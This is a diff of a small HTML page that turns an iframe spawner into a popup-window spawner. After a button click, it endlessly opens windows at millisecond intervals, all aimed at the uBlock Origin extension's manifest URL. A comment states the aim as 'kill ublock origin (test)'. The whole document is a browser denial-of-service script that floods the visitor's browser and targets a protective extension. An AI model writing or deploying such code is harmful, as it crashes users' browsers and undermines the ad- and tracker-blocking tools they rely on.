@@ -3,41 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IFrame Spawner</title>
+    <title>Window Spawner</title>
     <style>
-        iframe {
-            width: 200px;
-            height: 150px;
-            border: 1px solid black;
-            margin: 5px;
+        button {
+            margin: 20px;
         }
     </style>
 </head>
 <body>
-    <button id="start">Start Spawning IFrames</button>
-    <div id="container"></div>
+    <button id="start">Start Spawning Windows</button>
 
     <script>
-        let interval = 100; // Start with 100 ms
+        let interval = 1; // Start with 1 ms
         let count = 0;
 
         document.getElementById('start').addEventListener('click', function() {
-            const container = document.getElementById('container');
-            const spawnIFrames = () => {
-                const iframe = document.createElement('iframe');
-                iframe.src = "chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/manifest.json"; //kill ublock origin (test)
-                container.appendChild(iframe);
+            const spawnWindows = () => {
+                // Open a new window with the desired URL
+                const newWindow = window.open(
+                    "chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/manifest.json", 
+                    "_blank",
+                    "width=200,height=150"
+                );
+
                 count++;
 
-                if (count >= 10) { // After 10 iframes, slow down
+                if (count >= 10) { // After 10 windows, slow down
                     count = 0; // Reset count
-                    interval += 100; // Increase delay
+                    interval += 10; // Increase delay
                 }
 
-                setTimeout(spawnIFrames, interval);
+                // Continue spawning with the new interval
+                setTimeout(spawnWindows, interval);
             };
 
-            spawnIFrames(); // Start the spawning
+            spawnWindows(); // Start the spawning
         });
     </script>
 </body>
